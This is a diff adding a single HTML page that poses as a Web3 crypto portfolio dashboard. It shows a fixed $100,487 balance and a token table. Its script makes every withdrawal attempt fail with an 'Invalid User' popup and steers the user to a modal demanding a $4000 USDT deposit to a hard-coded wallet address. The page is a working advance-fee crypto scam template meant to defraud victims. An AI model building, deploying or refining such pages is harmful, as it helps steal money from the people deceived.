@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Web3 Portfolio</title>
+  <meta name="viewport" content="width=device-width, initial-scale=0.5, maximum-scale=1.0, user-scalable=no">
+  <style>
+    body {
+      background: #131313;
+      min-height: 100vh;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      margin: 0;
+      color: #fff;
+    }
+    .main-wrap {
+      max-width: 600px;
+      margin: 40px auto;
+      display: flex;
+      flex-direction: column;
+      gap: 28px;
+    }
+    .small-portfolio-card {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      background: #191919;
+      padding: 14px 20px 14px 12px;
+      border-radius: 14px;
+      box-shadow: 0 2px 14px 0 rgba(0,0,0,0.13);
+      max-width: 340px;
+      margin: 0 auto 0 0;
+    }
+    .portfolio-photo {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 3px solid #f5c339;
+      background: #222;
+      margin-right: 18px;
+      flex-shrink: 0;
+    }
+    .portfolio-mini-table {
+      border-collapse: collapse;
+      font-size: 0.97rem;
+      color: #fff;
+    }
+    .portfolio-mini-table td {
+      padding: 3px 7px 3px 0;
+      font-weight: 500;
+      border: none;
+    }
+    .portfolio-mini-table .label {
+      color: #f5c339;
+      font-weight: 600;
+      padding-right: 9px;
+      min-width: 90px;
+    }
+    .portfolio-mini-table .value {
+      color: #fff;
+      font-weight: 400;
+    }
+    @media (max-width: 650px) {
+      .main-wrap, .portfolio-section, .gif-section, .token-table-section {
+        max-width: 99vw;
+      }
+      .portfolio-content {
+        padding: 22px 6vw 18px 6vw;
+      }
+      .wallet-btn {
+        padding: 11px 16vw;
+        font-size: 1em;
+      }
+      .gif-section img {
+        width: 100vw;
+        max-width: 99vw;
+      }
+      .deposit-card, .error-popup {
+        min-width: 90vw;
+        padding-left: 6vw;
+        padding-right: 6vw;
+      }
+      .small-portfolio-card {
+        max-width: 99vw;
+        padding: 12px 6vw 12px 6vw;
+      }
+      .portfolio-photo {
+        width: 48px;
+        height: 48px;
+        margin-right: 11px;
+      }
+      .portfolio-mini-table .label {
+        min-width: 70px;
+      }
+    }
+    .portfolio-section {
+      width: 100%;
+      max-width: 600px;
+      min-width: 0;
+      min-height: 210px;
+      border-radius: 12px;
+      box-shadow: 0 4px 30px 0 rgba(0,0,0,0.20);
+      position: relative;
+      overflow: hidden;
+      background: url('IMG_1099.jpeg') center center/cover no-repeat;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: stretch;
+      padding: 0;
+    }
+    .portfolio-overlay {
+      background: rgba(19,19,19, 0.85);
+      width: 100%;
+      height: 100%;
+      position: absolute;
+      z-index: 1;
+      top: 0; left: 0;
+    }
+    .portfolio-content {
+      position: relative;
+      z-index: 2;
+      padding: 32px 32px 24px 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+    }
+    .portfolio-title {
+      font-size: 1.1rem;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+      color: #f5c339;
+      font-weight: 600;
+    }
+    .portfolio-balance {
+      font-size: 2.3rem;
+      font-weight: bold;
+      color: #fff;
+      margin-bottom: 18px;
+      letter-spacing: 1px;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.14);
+    }
+    .wallet-buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 0;
+      width: 100%;
+      margin-top: 8px;
+    }
+    .wallet-btn {
+      padding: 12px 36px;
+      font-size: 1.08rem;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      background: #f5c339;
+      color: #131313;
+      transition: background 0.2s, color 0.2s;
+      box-shadow: 0 2px 8px rgba(245,195,57,0.10);
+    }
+    .wallet-btn.withdraw {
+      background: #232323;
+      color: #f5c339;
+      border: 1.5px solid #f5c339;
+    }
+    .wallet-btn:active {
+      filter: brightness(0.93);
+    }
+    .gif-section {
+      width: 100%;
+      max-width: 600px;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #191919;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 4px 18px 0 rgba(0,0,0,0.15);
+      padding: 0;
+      margin: 0;
+    }
+    .gif-section img {
+      display: block;
+      width: 100%;
+      max-width: 600px;
+      height: auto;
+      border-radius: 12px;
+      background: #191919;
+    }
+    .token-table-section {
+      width: 100%;
+      max-width: 600px;
+      margin: 0;
+      background: #181818;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 18px 0 rgba(0,0,0,0.12);
+      padding: 0;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: none;
+      font-size: 1rem;
+    }
+    thead {
+      background: #181818;
+    }
+    th, td {
+      padding: 13px 12px;
+      font-size: 1rem;
+      font-weight: 500;
+    }
+    th {
+      color: #f5c339;
+      font-weight: 700;
+      background: #232323;
+      border-bottom: 2px solid #282828;
+      letter-spacing: 0.03em;
+    }
+    tr:not(:last-child) td {
+      border-bottom: 1px solid #232323;
+    }
+    td, th {
+      vertical-align: middle;
+    }
+    th:first-child, td:first-child {
+      text-align: left;
+      width: 38%;
+    }
+    th:nth-child(2), td:nth-child(2) {
+      text-align: center;
+      width: 32%;
+    }
+    th:last-child, td:last-child {
+      text-align: right;
+      width: 30%;
+    }
+    /* Modal overlays */
+    .deposit-page,
+    .error-popup-bg {
+      display: flex;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(19,19,19,0.90);
+      z-index: 100;
+      justify-content: center;
+      align-items: center;
+    }
+    .hidden {
+      display: none !important;
+    }
+    .deposit-card {
+      background: #222;
+      border-radius: 18px;
+      padding: 32px 20px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.28);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-width: 320px;
+    }
+    .deposit-card img {
+      width: 150px;
+      height: 150px;
+      object-fit: contain;
+      margin-bottom: 22px;
+      border-radius: 12px;
+      background: #191919;
+      box-shadow: 0 2px 8px rgba(245,195,57,0.10);
+    }
+    .deposit-desc {
+      font-size: 1.16rem;
+      color: #f5c339;
+      margin-bottom: 8px;
+      text-align: center;
+      font-weight: 500;
+    }
+    .deposit-close {
+      margin-top: 20px;
+      padding: 10px 36px;
+      background: #f5c339;
+      color: #222;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    .error-popup-bg {
+      background: rgba(0,0,0,0.60);
+      z-index: 200;
+    }
+    .error-popup {
+      background: #232323;
+      color: #f5c339;
+      border-radius: 14px;
+      padding: 32px 20px 20px 20px;
+      box-shadow: 0 2px 24px rgba(245,195,57,0.08);
+      min-width: 320px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+    .error-title {
+      font-size: 1.28rem;
+      font-weight: bold;
+      margin-bottom: 14px;
+      text-align: center;
+    }
+    .error-desc {
+      font-size: 1rem;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+    .error-actions {
+      display: flex;
+      gap: 14px;
+      margin-top: 8px;
+    }
+    .error-btn {
+      padding: 9px 30px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 500;
+      background: #f5c339;
+      color: #222;
+      transition: background 0.2s;
+    }
+    .error-btn.secondary {
+      background: #232323;
+      color: #f5c339;
+      border: 1.5px solid #f5c339;
+    }
+    /* --- Custom for image at page bottom --- */
+    .bottom-image-section {
+      width: 100%;
+      max-width: 600px;
+      margin: 38px auto 0 auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-radius: 14px;
+      background: #191919;
+      padding: 20px 0 24px 0;
+      box-shadow: 0 2px 14px 0 rgba(0,0,0,0.12);
+    }
+    .bottom-image-section img {
+      max-width: 90vw;
+      width: 320px;
+      height: auto;
+      border-radius: 10px;
+      object-fit: contain;
+      display: block;
+      background: #181818;
+    }
+    @media (max-width: 650px) {
+      .bottom-image-section img {
+        max-width: 99vw;
+        width: 98vw;
+      }
+      .bottom-image-section {
+        max-width: 99vw;
+        padding: 10px 0 12px 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-wrap">
+    <!-- Small Portfolio Card at the Top -->
+    <div class="small-portfolio-card">
+      <img class="portfolio-photo" src="IMG_1100.jpeg" alt="User Photo" />
+      <table class="portfolio-mini-table">
+        <tr>
+          <td class="label">Registered ID</td>
+          <td class="value">( Gad Gadot )</td>
+        </tr>
+        <tr>
+          <td class="label">Referral Code</td>
+          <td class="value">( Yesira )</td>
+        </tr>
+      </table>
+    </div>
+    <!-- Portfolio Section with background image and overlay -->
+    <div class="portfolio-section">
+      <div class="portfolio-overlay"></div>
+      <div class="portfolio-content">
+        <div class="portfolio-title">Portfolio Balance</div>
+        <div id="portfolio-balance-amount" class="portfolio-balance">$100,487</div>
+        <div class="wallet-buttons">
+          <button class="wallet-btn" id="startup-btn">Start up</button>
+          <button class="wallet-btn withdraw" id="withdraw-btn">Withdrawal</button>
+        </div>
+      </div>
+    </div>
+    <!-- GIF Section -->
+    <div class="gif-section">
+      <img src="IMG_0898.gif" alt="Wallet Overview" />
+    </div>
+    <!-- Token Table Section -->
+    <div class="token-table-section">
+      <table>
+        <thead>
+          <tr>
+            <th>Token</th>
+            <th>Available Balance</th>
+            <th>Price</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>USDT</td>
+            <td>$40,000</td>
+            <td>$1.00</td>
+          </tr>
+          <tr>
+            <td>BTC</td>
+            <td>$13,500</td>
+            <td>$104,131.08</td>
+          </tr>
+          <tr>
+            <td>SOLANA</td>
+            <td>$6,987</td>
+            <td>$157.06</td>
+          </tr>
+          <tr>
+            <td>BNB</td>
+            <td>$10,00</td>
+            <td>$600</td>
+          </tr>
+          <tr>
+            <td>ETH</td>
+            <td>$20,000</td>
+            <td>$2,533.35</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <!-- Bottom image section (the image you want displayed at the last part of the page) -->
+    <div class="bottom-image-section">
+      <img src="IMG_1099.jpeg" alt="Bottom Section Image" />
+    </div>
+  </div>
+  <!-- Start Up Modal -->
+  <div class="deposit-page hidden" id="startup-modal">
+    <div class="deposit-card">
+      <img src="IMG_1089.jpeg" alt="Deposit Wallet">
+      <div class="deposit-desc">Start up your wallet and access referral balance.</div>
+      <div class="error-desc">Access your referral balance now. <b>Minimum to activate: $4000 USDT</b> [ TAFpmstXRzCTPoZrsU81QysV7ZHCdnMEBF ]</div>
+      <button class="deposit-close" id="startup-close">Close</button>
+    </div>
+  </div>
+  <!-- Invalid User Modal -->
+  <div class="error-popup-bg hidden" id="invalid-user-popup">
+    <div class="error-popup">
+      <div class="error-title">Invalid User Start up</div>
+      <div class="error-desc">Access Referral Balance</div>
+      <div class="error-actions">
+        <button class="error-btn" id="activate-now-btn">Activate now</button>
+        <button class="error-btn secondary" id="close-error-btn">Close</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    document.getElementById('portfolio-balance-amount').textContent = '$100,487';
+    const startupBtn = document.getElementById('startup-btn');
+    const withdrawBtn = document.getElementById('withdraw-btn');
+    const startupModal = document.getElementById('startup-modal');
+    const startupClose = document.getElementById('startup-close');
+    const invalidUserPopup = document.getElementById('invalid-user-popup');
+    const activateNowBtn = document.getElementById('activate-now-btn');
+    const closeErrorBtn = document.getElementById('close-error-btn');
+
+    // "Start up" button opens start up modal
+    startupBtn.onclick = function(e) {
+      startupModal.classList.remove('hidden');
+    };
+    // Withdrawal button opens invalid user modal
+    withdrawBtn.onclick = function(e) {
+      invalidUserPopup.classList.remove('hidden');
+    };
+    // Close start up modal
+    startupClose.onclick = function(e) {
+      startupModal.classList.add('hidden');
+    };
+    // Activate now redirects to start up modal
+    activateNowBtn.onclick = function(e) {
+      invalidUserPopup.classList.add('hidden');
+      startupModal.classList.remove('hidden');
+    };
+    // Close invalid user popup
+    closeErrorBtn.onclick = function(e) {
+      invalidUserPopup.classList.add('hidden');
+    };
+    // Allow clicking outside modal to close
+    window.onclick = function(e) {
+      if (e.target === startupModal) {
+        startupModal.classList.add('hidden');
+      }
+      if (e.target === invalidUserPopup) {
+        invalidUserPopup.classList.add('hidden');
+      }
+    };
+  </script>
+</body>
+</html>
